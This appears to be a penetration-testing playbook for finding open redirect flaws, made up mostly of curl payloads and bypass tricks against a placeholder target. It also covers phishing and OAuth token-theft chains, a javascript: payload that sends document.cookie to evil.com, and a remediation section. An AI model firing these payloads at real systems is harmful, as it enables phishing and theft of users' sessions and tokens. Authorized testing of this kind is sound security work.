---
name: testing-for-open-redirect-vulnerabilities
description: Identify and test open redirect vulnerabilities in web applications by analyzing URL redirection parameters, bypass techniques, and exploitation chains for phishing and token theft.
domain: cybersecurity
subdomain: web-application-security
tags: [open-redirect, url-redirect, phishing, owasp, url-validation, redirect-bypass, unvalidated-redirect]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for Open Redirect Vulnerabilities

## When to Use
- When testing login/logout flows that redirect users to specified URLs
- During assessment of OAuth authorization endpoints with redirect_uri parameters
- When auditing applications with URL parameters (next, url, redirect, return, goto, target)
- During phishing simulation to chain open redirects with credential harvesting
- When testing SSO implementations for redirect validation weaknesses

## Prerequisites
- Burp Suite or OWASP ZAP for intercepting redirect requests
- Collection of open redirect bypass payloads
- External domain or Burp Collaborator for redirect confirmation
- Understanding of URL parsing and encoding schemes
- Browser with developer tools for observing redirect chains
- Knowledge of HTTP 301/302/303/307/308 redirect status codes

## Workflow

### Step 1 — Identify Redirect Parameters
```bash
# Common redirect parameter names to test:
# ?url= ?redirect= ?next= ?return= ?returnUrl= ?goto= ?target=
# ?dest= ?destination= ?redir= ?redirect_uri= ?continue= ?view=

# Search for redirect parameters in the application
# Use Burp Suite to crawl and identify all parameters

# Test basic redirect
curl -v "http://target.com/login?next=https://evil.com"
curl -v "http://target.com/logout?redirect=https://evil.com"
curl -v "http://target.com/oauth/authorize?redirect_uri=https://evil.com"
```

### Step 2 — Test Basic Open Redirect Payloads
```bash
# Direct external URL
curl -v "http://target.com/redirect?url=https://evil.com"

# Protocol-relative URL
curl -v "http://target.com/redirect?url=//evil.com"

# URL with @ symbol (userinfo abuse)
curl -v "http://target.com/redirect?url=https://target.com@evil.com"

# Backslash-based redirect
curl -v "http://target.com/redirect?url=https://evil.com\@target.com"

# Null byte injection
curl -v "http://target.com/redirect?url=https://evil.com%00.target.com"
```

### Step 3 — Apply Validation Bypass Techniques
```bash
# Subdomain confusion bypass
curl -v "http://target.com/redirect?url=https://target.com.evil.com"
curl -v "http://target.com/redirect?url=https://evil.com/target.com"

# URL encoding bypass
curl -v "http://target.com/redirect?url=https%3A%2F%2Fevil.com"
curl -v "http://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"

# Double URL encoding
curl -v "http://target.com/redirect?url=%2568%2574%2574%2570%253A%252F%252Fevil.com"

# Mixed case protocol
curl -v "http://target.com/redirect?url=HtTpS://evil.com"

# CRLF injection in redirect
curl -v "http://target.com/redirect?url=%0d%0aLocation:%20https://evil.com"

# JavaScript protocol
curl -v "http://target.com/redirect?url=javascript:alert(document.domain)"

# Data URI
curl -v "http://target.com/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Step 4 — Test Path-Based Redirects
```bash
# Relative path injection
curl -v "http://target.com/redirect?url=/\evil.com"
curl -v "http://target.com/redirect?url=/.evil.com"

# Path traversal with redirect
curl -v "http://target.com/redirect?url=/../../../evil.com"

# Fragment-based bypass
curl -v "http://target.com/redirect?url=https://evil.com#target.com"

# Parameter pollution for redirect
curl -v "http://target.com/redirect?url=https://target.com&url=https://evil.com"
```

### Step 5 — Chain with Other Vulnerabilities
```bash
# Chain with OAuth for token theft
# Step 1: Find open redirect on target.com
# Step 2: Use it as redirect_uri in OAuth flow
curl -v "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=http://target.com/redirect?url=https://evil.com&response_type=code"

# Chain with phishing
# Create convincing phishing page at evil.com
# Use open redirect: http://target.com/redirect?url=https://evil.com/login
# Victim sees target.com in the initial URL

# Chain with XSS via javascript: protocol
curl -v "http://target.com/redirect?url=javascript:fetch('https://evil.com/?c='+document.cookie)"
```

### Step 6 — Automate Open Redirect Testing
```bash
# Use OpenRedireX for automated testing
python3 openredirex.py -l urls.txt -p payloads.txt --keyword FUZZ

# Use gf tool to extract redirect parameters from URLs
cat urls.txt | gf redirect | sort -u > redirect_params.txt

# Mass test with nuclei
echo "http://target.com" | nuclei -t http/vulnerabilities/generic/open-redirect.yaml

# Test with ffuf
ffuf -w open-redirect-payloads.txt -u "http://target.com/redirect?url=FUZZ" -mr "Location: https://evil"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Unvalidated Redirect | Application redirects to user-supplied URL without checking destination |
| URL Parsing Inconsistency | Different libraries parse URLs differently, enabling bypass |
| Protocol-Relative URL | Using // prefix to redirect while inheriting current protocol |
| Userinfo Abuse | Using @ symbol to make URL appear to belong to trusted domain |
| Open Redirect Chain | Combining multiple open redirects or chaining with other vulnerabilities |
| DOM-Based Redirect | Client-side JavaScript performing redirect using attacker-controlled input |
| Meta Refresh Redirect | HTML meta tag performing redirect without server-side 302 |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| OpenRedireX | Automated open redirect vulnerability testing tool |
| Burp Suite | HTTP proxy for intercepting and modifying redirect parameters |
| gf (tomnomnom) | Pattern matcher to extract redirect parameters from URL lists |
| nuclei | Template-based scanner with open redirect detection templates |
| ffuf | Fuzzer for mass-testing redirect parameter payloads |
| OWASP ZAP | Automated scanner with open redirect detection |

## Common Scenarios

1. **Phishing Amplification** — Use open redirect on a trusted domain to lend credibility to phishing URLs targeting users
2. **OAuth Token Theft** — Exploit open redirect as redirect_uri in OAuth flows to steal authorization codes and access tokens
3. **SSO Bypass** — Redirect SSO authentication responses to attacker-controlled servers to capture session tokens
4. **XSS via Redirect** — Chain open redirect with javascript: protocol to achieve cross-site scripting
5. **Referer Leakage** — Use open redirect to leak sensitive tokens in Referer headers when redirecting to external sites

## Output Format

```
## Open Redirect Assessment Report
- **Target**: http://target.com
- **Vulnerable Parameters Found**: 3
- **Bypass Techniques Required**: URL encoding, userinfo abuse

### Findings
| # | Endpoint | Parameter | Payload | Impact |
|---|----------|-----------|---------|--------|
| 1 | /login | next | //evil.com | Phishing |
| 2 | /oauth/authorize | redirect_uri | https://target.com@evil.com | Token Theft |
| 3 | /logout | return | https://evil.com%00.target.com | Session Redirect |

### Remediation
- Implement allowlist of permitted redirect destinations
- Validate redirect URLs server-side using strict URL parsing
- Reject any redirect URL containing external domains
- Use indirect reference maps instead of direct URL parameters
```
